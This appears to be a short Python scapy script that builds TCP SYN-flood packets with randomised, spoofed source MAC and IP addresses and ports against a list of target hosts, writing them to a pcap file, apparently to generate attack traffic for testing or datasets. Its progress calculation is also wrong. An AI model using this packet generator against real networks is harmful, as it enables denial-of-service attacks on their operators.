from scapy.all import *
def tcp_syn_attack_craft_packets(black_list):
    for i in range(0, 10000):
        for target_host in black_list:
            mac_addr = target_host.mac_addres
            ipv4_addr = target_host.ipv4_address
            ethernet_temp_frame = Ether(src=RandMAC()._fix(), dst=mac_addr, type=ETH_P_IP)
            tcp_temp_datagram = IP(src=RandIP()._fix(), dst=ipv4_addr) / TCP(sport=RandShort()._fix(),
                                                                              dport=RandShort()._fix(), flags="S",
                                                                              seq=RandInt()._fix())
            temp_packet = ethernet_temp_frame/tcp_temp_datagram
            #temp_packet.show2()
            wrpcap('tcp_syn_attack.pcap', temp_packet, append=True)
        if(i%100 == 0):
            print(str(i/200*100)+'%')